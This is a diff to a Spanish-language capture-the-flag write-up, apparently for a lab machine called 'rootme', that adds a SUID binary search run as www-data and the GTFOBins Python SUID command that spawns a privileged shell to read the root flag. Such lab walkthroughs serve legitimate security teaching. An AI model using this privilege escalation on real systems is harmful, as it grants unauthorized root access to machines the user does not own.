@@ -112,12 +112,33 @@ www-data@rootme:/$
 Para ello buscaremos aquellos binarios que tengan el SUID activado, estos archivos se ejecutan con los permisos del propietario (normalmente root), sin importar quién los ejecute.
 
 ```
+www-data@rootme:/$ find -perm -4000 2>/dev/null
+find -perm -4000 2>/dev/null
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/bin/traceroute6.iputils
+./usr/bin/newuidmap
+./usr/bin/newgidmap
+./usr/bin/chsh
+./usr/bin/python
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/gpasswd
+./usr/bin/sudo
+./usr/bin/newgrp
+./usr/bin/passwd
+./usr/bin/pkexec
 
 ```
 Si buscamos en GTFOBins veremos que el binario de python es vulnerable a SUID
 
 ```
-sudo install -m =xs $(which python) .
-./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+install -m =xs $(which python) .
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
+Fianlmente si accedemos a la carpeta de root veremos el flag de root.txt
 
